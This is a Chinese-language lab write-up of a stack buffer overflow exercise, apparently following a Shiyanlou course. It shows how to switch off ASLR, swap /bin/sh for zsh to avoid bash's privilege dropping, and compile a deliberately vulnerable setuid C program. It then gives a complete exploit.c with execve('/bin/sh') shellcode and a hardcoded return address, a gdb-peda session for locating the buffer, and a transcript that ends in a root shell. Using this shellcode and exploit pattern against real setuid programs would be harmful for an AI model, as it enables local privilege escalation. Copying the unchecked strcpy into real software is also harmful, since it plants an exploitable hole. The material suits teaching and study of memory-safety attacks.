# 实验目标


# 知识预备

- 栈溢出的本质：

程序接收外来数据（参数的形式），并对参数没有进行安检，导致进入的数据大于原变量大小，改变了原有的关键数据（使原有的执行逻辑发生改变），甚至注入了可执行的代码数据。

- shellcode:

ShellCode最初时指能打开root权限的Shell（甚至还是远程的） 的一段代码，后来就泛指可注入的，执行可完成特定任务的一段二进制代码。
 
一般情况下，缓冲区溢出会造成程序崩溃，在程序中，溢出的数据覆盖了返回地址。而如果覆盖返回地址的数据是另一个地址，那么程序就会跳转到该地址，如果该地址存放的是一段精心设计的代码用于实现其他功能，这段代码就是shellcode

- X86平台函数参数及局部变量在栈中的分布原理
- 
# 实验环境
- ubuntu 14.04 x86 

# 相关工具
- gcc 
- gdb
- gdb-peda
- 
# 实验笔记

## 环境准备
- 关闭ＤＥＰ保护
- 关闭ASLR保护

查看当前系统的ＡＳＬＲ保护状态：

```
cat /proc/sys/kernel/randomize_va_space  
```
注：

0 - 表示关闭进程地址空间随机化。
1 - 表示将mmap的基址，stack和vdso页面随机化。
2 - 表示在1的基础上增加栈（heap）的随机化。

关闭ASLR功能：

```
echo 0 >/proc/sys/kernel/randomize_va_space   
```

注：通过PEDA也可以查看ASLR的保护状态：

```
gdb-peda$ aslr
ASLR is OFF

```

- 安装相关工具

```
sudo apt-get install zsh

```
使用zsh替代默认的/bin/bash ,这样可以避免bash的保护措施，因为防范缓冲区溢出攻击及其它利用shell程序的攻击，许多shell程序在被调用时自动放弃它们的特权。因此，即使你能欺骗一个Set-UID程序调用一个shell，也不能在这个shell中保持root权限，这个防护措施在/bin/bash中实现

相关操作指令　：

```
sudo su

cd /bin

cp sh sh.bak

rm sh

ln -s zsh sh

exit

```


## 实验步骤



###  漏洞程序　stack.c 

代码文件：

```

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bof(char *str)
{
    char buffer[12];
    strcpy(buffer, str);
    return 1;
}

int main(int argc, char *argv[])
{
    char str[517];
    FILE *badfile;
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```

编译：

```
magc-VirtualBox% sudo -s
[sudo] password for magc: 
root@magc-VirtualBox:~/workspace# gcc -g -z execstack -fno-stack-protector -o stack stack.c 
root@magc-VirtualBox:~/workspace# chmod u+s stack
root@magc-VirtualBox:~/workspace# exit

```
### 攻击程序 exploit.c


```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] = 
"\x31\xc0"    //xorl %eax,%eax
"\x50"        //pushl %eax
"\x68""//sh"  //pushl $0x68732f2f
"\x68""/bin"  //pushl $0x6e69622f
"\x89\xe3"    //movl %esp,%ebx
"\x50"        //pushl %eax
"\x53"        //pushl %ebx
"\x89\xe1"    //movl %esp,%ecx
"\x99"        //cdq
"\xb0\x0b"    //movb $0x0b,%al
"\xcd\x80"    //int $0x80
;
int main(int argc, char *argv[])
{
    char buffer[517];
    FILE *badfile;
    memset(&buffer, 0x90, 517);
    strcpy(buffer, "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf4\xf4\xff\xbf");
    strcpy(buffer+100, shellcode);
    badfile = fopen("./badfile","w");
    fwrite(buffer,517,1,badfile);
    fclose(badfile);
    return 0;
}


```



找string



```
gdb-peda$ aslr
ASLR is OFF
gdb-peda$ disa
disable      disassemble  
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x080484dc <+0>:	push   ebp
   0x080484dd <+1>:	mov    ebp,esp
   0x080484df <+3>:	and    esp,0xfffffff0
   0x080484e2 <+6>:	sub    esp,0x220
   0x080484e8 <+12>:	mov    DWORD PTR [esp+0x4],0x80485e0
   0x080484f0 <+20>:	mov    DWORD PTR [esp],0x80485e2
   0x080484f7 <+27>:	call   0x80483b0 <fopen@plt>
   0x080484fc <+32>:	mov    DWORD PTR [esp+0x21c],eax
   0x08048503 <+39>:	mov    eax,DWORD PTR [esp+0x21c]
   0x0804850a <+46>:	mov    DWORD PTR [esp+0xc],eax
   0x0804850e <+50>:	mov    DWORD PTR [esp+0x8],0x205
   0x08048516 <+58>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804851e <+66>:	lea    eax,[esp+0x17]
   0x08048522 <+70>:	mov    DWORD PTR [esp],eax
   0x08048525 <+73>:	call   0x8048360 <fread@plt>
   0x0804852a <+78>:	lea    eax,[esp+0x17]
   0x0804852e <+82>:	mov    DWORD PTR [esp],eax
   0x08048531 <+85>:	call   0x80484bd <bof>
   0x08048536 <+90>:	mov    DWORD PTR [esp],0x80485ea
   0x0804853d <+97>:	call   0x8048380 <puts@plt>
   0x08048542 <+102>:	mov    eax,0x1
   0x08048547 <+107>:	leave  
   0x08048548 <+108>:	ret    
End of assembler dump.
gdb-peda$ b *0x080484e8
Breakpoint 1 at 0x80484e8
gdb-peda$ r

[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0xb7fc3000 --> 0x1aada8 
ECX: 0xe2377b08 
EDX: 0xbffff6e4 --> 0xb7fc3000 --> 0x1aada8 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff6b8 --> 0x0 
ESP: 0xbffff490 --> 0xb7e25378 --> 0x1753 
EIP: 0x80484e8 (<main+12>:	mov    DWORD PTR [esp+0x4],0x80485e0)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80484dd <main+1>:	mov    ebp,esp
   0x80484df <main+3>:	and    esp,0xfffffff0
   0x80484e2 <main+6>:	sub    esp,0x220
=> 0x80484e8 <main+12>:	mov    DWORD PTR [esp+0x4],0x80485e0
   0x80484f0 <main+20>:	mov    DWORD PTR [esp],0x80485e2
   0x80484f7 <main+27>:	call   0x80483b0 <fopen@plt>
   0x80484fc <main+32>:	mov    DWORD PTR [esp+0x21c],eax
   0x8048503 <main+39>:	mov    eax,DWORD PTR [esp+0x21c]
[------------------------------------stack-------------------------------------]
0000| 0xbffff490 --> 0xb7e25378 --> 0x1753 
0004| 0xbffff494 --> 0xb7fdc858 --> 0xb7e18000 --> 0x464c457f 
0008| 0xbffff498 --> 0x0 
0012| 0xbffff49c --> 0xb7fee328 (<_dl_check_map_versions+632>:	mov    edi,eax)
0016| 0xbffff4a0 --> 0x7 
0020| 0xbffff4a4 --> 0x10 
0024| 0xbffff4a8 --> 0x1 
0028| 0xbffff4ac --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080484e8 in main ()
gdb-peda$ i r $esp
esp            0xbffff490	0xbffff490

```
buffer + 100 的值：

0xbffff490　+ 100(10进制)　即　0xbffff490　+ 0x64 = 0xbffff4f4


开始攻击　：

```
magc-VirtualBox% whoami
magc
magc-VirtualBox% ./exploit 
magc-VirtualBox% ./stack 
# whoami                                                   
root
#          
```
注：执行stack过程中，却打开了一个新的shell,并且成为了root,攻击并提权成功！




# 实验总结

- 栈中参数和局部变量的分配
- 溢出返回地址的位置查找



# 参考 
- 实验楼 https://www.shiyanlou.com/courses/231
